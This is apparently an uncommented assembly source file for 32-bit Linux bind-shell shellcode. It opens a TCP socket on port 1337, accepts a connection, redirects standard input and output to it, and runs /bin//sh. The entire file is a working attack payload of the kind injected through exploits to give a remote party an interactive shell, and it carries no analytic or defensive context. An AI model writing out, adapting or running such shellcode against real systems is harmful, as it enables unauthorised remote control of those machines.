global _start

section .text
_start:

;    push 0x66
    xor esi, esi
    mul esi
    mov  al, 0x66
    push 0x1
    pop  ebx
    push esi
    push ebx
    push 0x2
    mov  ecx,esp
    int  0x80
    pop  edi
    xchg edi,eax
    xchg ebx,eax
    mov  al,0x66
    push esi
    push  0x3905
    push bx
    mov  ecx,esp
    push 0x10
    push ecx
    push edi
    mov  ecx,esp
    int  0x80
    mov  al,0x66
    mov  bl,0x4
    push esi
    push edi
    mov  ecx,esp
    int  0x80
    mov  al,0x66
    inc  ebx
    push esi
    push esi
    push edi
    mov  ecx,esp
    int  0x80
    pop  ecx
    pop  ecx
    mov  cl,0x2
    xchg ebx,eax

loop:
    mov  al,0x3f
    int  0x80
    dec  ecx
    jns  loop
    mov  al,0xb
    push 0x68732f2f
    push 0x6e69622f
    mov  ebx,esp
    inc  ecx
    mov  edx,ecx
    int  0x80
